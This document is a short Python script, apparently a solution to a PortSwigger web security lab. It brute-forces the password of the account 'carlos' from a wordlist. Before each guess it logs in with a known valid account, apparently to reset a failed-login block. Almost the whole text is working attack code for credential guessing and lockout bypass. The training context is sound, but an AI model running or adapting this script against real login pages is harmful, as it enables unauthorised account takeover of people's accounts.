import requests
import sys

def login(username, password, url):
    response = requests.post(url, data={'username': username, 'password': password})
    return response.status_code, response.text

def main(url):
    burp_url = url + '/login'

    try:
        with open('../Portswigger_lists/password_list.txt', 'r') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print("Password file not found.")
        sys.exit(1)

    known_username = 'wiener'
    known_password = 'peter'
    target_username = 'carlos'

    for i, password in enumerate(passwords):
        status_code, response_text = login(known_username, known_password, burp_url)

        status_code, response_text = login(target_username, password, burp_url)

        if "Login successful" in response_text:
            print(f"Password found: {password}")
            break

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

    main(sys.argv[1])

#presumably the task was solved before the script ended. I didn't want to add additional conditions ;)
